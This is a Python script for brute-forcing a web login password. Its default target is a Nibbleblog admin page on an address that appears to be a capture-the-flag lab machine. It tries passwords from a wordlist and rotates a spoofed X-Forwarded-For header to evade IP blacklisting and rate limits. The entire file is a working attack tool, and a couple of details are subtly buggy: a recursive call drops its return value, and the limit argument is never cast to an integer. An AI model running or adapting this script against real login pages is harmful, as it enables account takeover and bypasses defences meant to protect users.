import argparse
from random import randint

import requests


class PasswordGuesser:
    def __init__(self, **kwargs):
        self.target = kwargs["target"]
        self.username = kwargs["username"]
        self.passwords = kwargs["passwords"]
        self.startat = kwargs["startat"]
        self.failure = kwargs["failure"]
        self.blacklist = kwargs["blacklist"]
        self.limit = kwargs["limit"]

        self.used_ips = set()

    def generate_random_ip(self) -> str:
        """Generate a random IP address.

        :return: A random IP address.
        """
        ip_address = ".".join(str(randint(0, 255)) for _ in range(4))

        if ip_address in self.used_ips:
            self.generate_random_ip()
        else:
            self.used_ips.add(ip_address)
            return ip_address

    def attempt_login(self, password: str, ip_address: str) -> bool:
        """Performs a login using a given password.

        :param password: The password to try.
        :param ip_address: Spoof the attacker"s IP address with this one.
        :return: True for a successful login, otherwise False.
        """
        headers = {
            "X-Forwarded-For": ip_address
        }

        payload = {
            "username": self.username,
            "password": password
        }

        r = requests.post(self.target,
                          headers=headers,
                          data=payload)

        if r.status_code == 500:
            print("Internal server error, aborting!")
            exit(1)

        if self.blacklist in r.text:
            print("Rate limit hit, aborting!")
            exit(1)

        return self.failure not in r.text

    def run(self):
        """Start the password guessing process."""
        ip_address: str = self.generate_random_ip()
        num_attempts: int = 1

        for password in self.passwords:
            if num_attempts < self.startat:
                num_attempts += 1
                continue

            if num_attempts % (self.limit - 1) == 0:
                ip_address = self.generate_random_ip()

            password = password.strip()
            print(f"Attempt {num_attempts}: {ip_address}\t\t{password}")

            if self.attempt_login(password, ip_address):
                print(f"Password for {self.username} is {password}")
                break

            num_attempts += 1


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Simple brute forcer to avoid IP bans using X-Forward-For."
        )
    parser.add_argument("-t", "--target",
                        default="http://10.10.10.75/nibbleblog/admin.php",
                        required=False,
                        help="Full target of the remote host.")
    parser.add_argument("-u", "--username",
                        default="admin",
                        required=False,
                        help="Target username.")
    parser.add_argument("-p", "--passwords",
                        required=True,
                        help="Password list (e.g., rockyou.txt).")
    parser.add_argument("-i", "--startat",
                        default=0,
                        required=False,
                        help="Start at specific index of password file.")
    parser.add_argument("-f", "--failure",
                        default="Incorrect username or password",
                        required=False,
                        help="String value for failed result.")
    parser.add_argument("-b", "--blacklist",
                        default="Blacklist protection",
                        required=False,
                        help="String value for blacklist hit result.")
    parser.add_argument("-l", "--limit",
                        default=5,
                        required=False,
                        help="Blacklist limit.")
    args = parser.parse_args()

    # Open password file and read into memory
    passwords = list()
    with open(args.passwords, encoding="utf8", errors="surrogateescape") as f:
        for line in f:
            line = line.strip()
            passwords.append(line)

    password_guesser = PasswordGuesser(target=args.target,
                                       username=args.username,
                                       passwords=passwords,
                                       startat=int(args.startat),
                                       failure=args.failure,
                                       blacklist=args.blacklist,
                                       limit=args.limit)

    password_guesser.run()
